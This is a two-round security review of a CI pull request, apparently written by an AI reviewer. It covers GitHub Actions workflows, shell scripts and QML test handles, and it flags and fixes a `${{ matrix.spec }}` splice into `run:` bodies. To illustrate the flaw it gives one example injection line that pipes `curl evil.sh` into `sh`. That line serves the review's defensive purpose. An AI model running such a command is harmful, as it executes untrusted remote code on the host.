# Security review — e2e-suite-review

Dimension covered: **security only** (correctness, readability and
architecture are other reviewers' rows). Scope: every file PR #164
(`8368b2f`) merged, as it stands at this piece's tip (`ee8e145`) — this
piece's own diff over `8368b2f...HEAD` touches only `CLAUDE.md` and
`openspec/`, no code, so there was nothing of this piece's own to review on
top of #164.

Files read in full: `.github/workflows/ui-tests.yml`; `.github/workflows/ci.yml`'s
`ui-specs` job and #164's other hunks (`git show 8368b2f -- .github/workflows/ci.yml`);
`dialectica-ui/src/qml/Main.qml`'s five root handles and `tst_e2e_handles.qml`;
`adjudicate-ui-run.sh`, `tst_adjudicate_ui_run.sh`, `require-jq-yq.sh`,
`tst_ui_tool_pins.sh`, `tst_scaffold_values_unchanged.sh`; `ui/join.yaml` and
`validate-ui-specs.mjs`; `check_qml_reachable.py`'s diff (confirmed docstring-only
via `git diff 767be15 8368b2f -- dialectica-ui/tests/check_qml_reachable.py`).

## Finding

- [x] **`dev-writer`** — `.github/workflows/ui-tests.yml:353-354,371` — `${{ matrix.spec }}`
      is spliced directly into three `run:` script bodies instead of going
      through an env-var indirection, unlike every other use of the same
      context value in this file.
      **Scenario:** the same file sets `env: SPEC: dialectica-ui/tests/ui/${{ matrix.spec }}.yaml`
      at job level (line 69) and `env: JOB_TOTAL: ${{ strategy.job-total }}`
      (line ~112) — both the GitHub-recommended pattern, because an `env:`
      value is passed to the shell as a real environment variable, not
      string-substituted into the script text. Lines 353-354
      (`--json "ui-results/${{ matrix.spec }}.json"`, `--junit "ui-results/${{ matrix.spec }}.xml"`)
      and line 371 (`"ui-results/${{ matrix.spec }}.json" "$SPEC"`) instead put
      `${{ matrix.spec }}` straight into the `run: |` body, where the Actions
      runner replaces the expression with its literal string *before* the
      shell parses the script. Any matrix value containing shell metacharacters
      (e.g. `` join`; curl evil.sh | sh` `` as a matrix entry) would execute as
      part of the command rather than being treated as one filename token.
      **Severity: low, not a fix-before-merge blocker.** `matrix.spec` is
      currently the hardcoded literal `join` (`strategy.matrix.spec: [join]`,
      the "ONE HAND-MAINTAINED LIST" the job's own comment names), so nothing
      today supplies an attacker-controlled value there — and a PR from a fork
      that wanted to inject a value would have to edit `ui-tests.yml` itself to
      do it, at which point it can already add an arbitrary `run:` step
      directly with no injection trick needed. Both workflows are on
      `pull_request` (not `pull_request_target`) with top-level
      `permissions: contents: read` and reference no `secrets.*` in either new
      job, so a fork PR run has nothing to steal via this or any other path
      inside these two files — confirmed by reading both workflows' `on:`,
      `permissions:` and every `env:`/`run:` block; no `secrets.` context
      appears anywhere in the `ui-specs` or `spec`/matrix jobs.
      **Why it is still worth fixing:** it is an inconsistency against the
      file's own established mitigation (used correctly twice in the same
      job), and the risk model changes the moment the matrix stops being a
      hand-typed single-element list — the exact failure mode
      `tst_ui_tool_pins.sh` and the "every spec in the tree is in the matrix"
      step both exist to guard against elsewhere in this file. Fix: derive a
      `RESULT_PATH: ui-results/${{ matrix.spec }}` (or similar) job/step `env:`
      value once and reference `$RESULT_PATH.json` / `$RESULT_PATH.xml` /
      `$RESULT_PATH` in the three `run:` bodies instead.
      **Measured:** not exploitable today (verified by reading both workflows'
      full trigger/permissions/secrets surface); this is a pattern finding, not
      a reproduced exploit — no CI run demonstrates impact, and none is needed
      to see the anti-pattern.
      **Fixed** in the commit that flips this box. `REPORT` and `JUNIT` are
      job-level `env:` values in `ui-tests.yml`'s `spec` job, beside `SPEC`,
      and the three `run:` bodies read `"$REPORT"`/`"$JUNIT"`. The same
      pattern was also in both workflows' `cargo install logos-scaffold
      --version ${{ env.LGS_VERSION }}`, ci.yml's `build` job included, and
      both now read `"$LGS_VERSION"`. A new check,
      `dialectica-ui/tests/tst_workflow_run_bodies.sh`, run from ci.yml's
      `ui-specs` job, fails on any `${{` in any `run:` body of any file under
      `.github/workflows/` (design.md D8). **Predicted** against the
      workflows before the edit: the two "as committed" checks red, naming
      those four steps, and the injected-splice and env-pairing cases green.
      **Observed:** the four steps named as predicted, and 3 red rather than
      2. The env-pairing case is built from the real `ui-tests.yml`, so until
      the edit it inherited that file's three splices; it went green with the
      edit. Mutation after the fix, restored: the check's `select` made to
      match nothing turns exactly the injected-splice case red (predicted 1,
      observed 1). `tst_ui_tool_pins.sh` still passes, so its
      "writes a version into its run: body" check does not read
      `"$LGS_VERSION"` as a literal.

## Clean

- **Workflow triggers and permissions.** Both `ci.yml` and `ui-tests.yml` use
  `on: pull_request` (never `pull_request_target` or `workflow_run`), so a
  fork PR runs with a read-only, secret-less token and the workflow file used
  is the PR's own. Top-level `permissions: contents: read` is explicit in both
  (not inherited from a repo default — `ci.yml`'s own comment gives the reason:
  a flipped repo default would otherwise hand a token that can push and mint
  releases to every job that runs third-party code). Neither new job
  (`ui-specs` in `ci.yml`, `spec` in `ui-tests.yml`) references `secrets.*` or
  requests a broader permission.
- **Supply chain / pinning.** `sitometres` and `yaml` are both pinned to exact
  versions (`@paradoxcomputer/sitometres@0.1.2`, `yaml@2.9.0`) in both the
  cheap (`ui-specs`) and expensive (`spec`) jobs, and `tst_ui_tool_pins.sh`
  fails CI if the two copies of the sitometres/lgs pins ever diverge or either
  stops being an exact version — including the case of a version written
  directly into a `run:` body, bypassing the compared `env:` value. This
  closes the exact gap #164's own security review found and fixed
  mid-PR (the earlier unpinned `yaml`/`pyyaml` install, per the merge commit's
  own log). `python3-yaml`/`pyyaml` are gone entirely; the only Python file in
  scope (`check_qml_reachable.py`) reads QML, confirmed unchanged except its
  docstring across the #164 merge. Third-party GitHub Actions
  (`cachix/install-nix-action`, `nix-community/cache-nix-action`) are
  SHA-pinned with a version comment; first-party `actions/*` actions are
  pinned to a major-version tag only, consistently with the rest of the repo's
  existing convention (not something #164 introduced) and with the file's own
  comment stating the SHA-pinning discipline is for third-party actions.
  `npm install`/`npx` run with no `--ignore-scripts`, so a compromised
  transitive dependency's install script would still run — a generic Node-CI
  risk this PR did not introduce and did not make worse; noted, not filed as a
  box, because fixing it is a repo-wide policy question, not specific to this
  code.
- **apt sources handling.** Both "install yq" steps move aside third-party apt
  sources by pattern (keeping only `ubuntu.sources`/`ubuntu.list`) before
  `apt-get update`, install only Ubuntu-archive packages, and tolerate
  `update` failing while treating `install` as the real gate. No third-party
  repository is added.
- **Shell injection in the new `.sh` scripts.** Read `adjudicate-ui-run.sh`,
  `require-jq-yq.sh`, `tst_adjudicate_ui_run.sh`, `tst_ui_tool_pins.sh` and
  `tst_scaffold_values_unchanged.sh` end to end. All `jq`/`yq`-derived values
  used in shell (`$count`, `$expected`, `$failed`, `$pin`, `$bin`, `$root`,
  `$logs`) are used inside quoted `"..."` expansions or `[ ... ]` tests, never
  concatenated into a string that is later `eval`'d or executed, and never
  handed to `printf` as the *format* argument (`printf '%s' "$problems"`, not
  `printf "$problems"` — the latter would be a format-string bug; the scripts
  correctly avoid it). `adjudicate-ui-run.sh`'s step-count comparison is
  written `[ "$count" -eq "$expected" ] || problem ...` specifically so a
  non-numeric value fails closed (`[` exits 2, which is `||`'s "true" branch,
  i.e. reported as a problem) rather than open — the script's own comment
  documents this was measured. No script here reads network-attacker-supplied
  bytes directly; all consume CI-local files (the sitometres JSON report,
  `scaffold.toml`, the workflow YAML) that a fork PR can only reach by editing
  the repo it already fully controls in its own branch.
- **`Main.qml`'s five new root handles** (`listReadState`, `stoaCount`,
  `pasteFailure`, `joinState`, `joinFailure`, `Main.qml:129-133`) are all
  `readonly property`, each a projection of state a screen already owns (no
  second, independently-writable copy), and deliberately carry no key or
  identity handle — confirmed by reading the surrounding comment block and
  `tst_e2e_handles.qml`'s fixtures, which pin each one against a
  null-implementation (constant-value) failure. A sitometres `state:`
  expression can only *read* these; QML's own `readonly` enforcement means an
  assignment attempt throws rather than mutating app state through the
  inspector.
- **`join.yaml`** is a fixed, repo-authored spec (not built from any runtime
  or peer-supplied input) and asserts presence/absence and failure-non-emptiness
  rather than pinning the wording of any core-supplied message, so a future
  reworded diagnostic cannot pass this spec for the wrong reason and no
  message content is echoed anywhere that would leak internal detail to a
  reader who shouldn't see it (this spec runs in CI only).
- **`validate-ui-specs.mjs`** reads only files in `dialectica-ui/tests/ui/`
  (a fixed, repo-controlled directory) via `readdirSync`, fails closed on an
  empty directory, and does not evaluate or execute anything from the parsed
  YAML beyond schema validation.

## Note to the runner (process, not a security finding)

This worktree's HEAD was forked at `8368b2f` (PR #164's merge commit, the
piece's *parent*), not at the piece branch's actual tip. `openspec/changes/e2e-suite-review/`
did not exist at that HEAD — `git ls-files` returned nothing for it — so the
proposal/design/tasks this brief asked me to read were absent until I
fast-forwarded this branch to `piece/134-e2e-suite-review`'s tip (`ee8e145`)
with `git merge --ff-only ee8e145` (a pure ref move; `8368b2f` was already an
ancestor, confirmed with `git merge-base --is-ancestor`, and the merge added
no code, only the missing `openspec/` and `CLAUDE.md` files). Worth checking
whether the other parallel reviewers on this piece hit the same stale base.

## Round 2 (HEAD 532794e)

Scope: `git diff ee8e145...HEAD` — the fix pass (job-level `env:` for
`REPORT`/`JUNIT`/`"$LGS_VERSION"`, the new `tst_workflow_run_bodies.sh` gate,
`install-yq.sh`), the `view-navigation` spec delta, and the new/extended
`tst_e2e_handles.qml` and `tst_adjudicate_ui_run.sh` cases, read in the context
of the whole suite as it now stands.

**The round-1 finding is fixed, confirmed against the live files, not just the
new test's own fixtures.** Converted both workflows with `yq . <file>` and read
every `steps[].run` value directly: `ui-tests.yml`'s `spec` job now carries
`REPORT`/`JUNIT` as job-level `env:` beside `SPEC`, its three consumers
(`--json`, `--junit`, the adjudicator call) read `"$REPORT"`/`"$JUNIT"`, and
both workflows' `cargo install logos-scaffold --version` lines read
`"$LGS_VERSION"`. No `${{` appears in any `run:` body of either file. Ran
`tst_workflow_run_bodies.sh` and `tst_ui_tool_pins.sh` directly (not read —
executed): both pass against the live workflows, and the former's own fixture
pair (a splice / the same value through `env:`) is reported / not-reported as
its comments claim. The new gate is wired into `ci.yml`'s `ui-specs` job, so it
runs on every PR rather than only existing as an uncalled script — the same gap
round 1's `design-review.md` flagged for its sibling
`tst_scaffold_values_unchanged.sh`, not repeated here.

**`install-yq.sh` opens nothing new.** Both call sites (`ci.yml` with no
arguments, `ui-tests.yml` with six hardcoded graphics-library names) pass only
repo-literal strings as `"$@"`, never a value that could carry attacker- or
even PR-branch-controlled content, so consolidating the apt-source-juggling
`sudo` procedure into one script does not change who can influence it. The
script still moves aside only non-Ubuntu apt sources, treats `install` (not
`update`) as the gate, and calls `require_jq_yq` after installing — the same
shape round 1 read clean, now in one place instead of two.

**The `adjudicate-ui-run.sh` NO-SPEC additions (D6, D7) keep the fail-closed
shape round 1 checked.** The new `expected=null` path (a spec whose `steps:`
is absent, non-list, or unparseable) is produced either by jq's own `null` or
by catching a `yq` failure with `if ! expected=$(...); then expected=null; fi`
— under `set -eu` this is the one place a bare `expected=$(...)` would
otherwise abort the script on `yq`'s exit code before the other two conditions
are checked, and the fallback correctly still leaves `problem` called and the
verdict/failed-steps checks running. Ran `tst_adjudicate_ui_run.sh` directly:
all cases pass, including the three new ones (no `steps:`, `steps: 2` as a
scalar, and unparseable YAML) and the two "names a run that never
started"/"was killed" additions to the missing-report case. These are CI-local
files (the sitometres report, the repo's own spec YAML), not peer- or
network-supplied bytes, so this is a CI-tooling robustness fix, not a
trust-boundary one — consistent with round 1's characterisation of this whole
script family.

**The `Main.qml` root handles are unchanged this round** — the diff touches
only `tst_e2e_handles.qml` (new table-driven cases and a `makeStandaloneMain`
helper) and `join.yaml` (a comment and a second refused-paste case), not the
five `readonly property` handles themselves or their `null`/no-bridge handling.
The new "no bridge to the core" case (`Core.bridge = null`, bypassing
`bridgeFor`) is exercised only inside `tst_e2e_handles.qml`'s own fixtures and
changes no production code path.

**No new dependency, no new secret, no new trigger.** The diff adds one new
script (`install-yq.sh`) and one new test script
(`tst_workflow_run_bodies.sh`), both shell, no new package installs beyond what
round 1 already reviewed (`yq`, the six graphics libraries), and no change to
either workflow's `on:`, `permissions:`, or `secrets.*` surface (grepped
`github.event` across both files: no hits, so no PR-title/body-shaped
injection vector was added alongside the `${{ … }}`-splice fix).

No new findings this round.
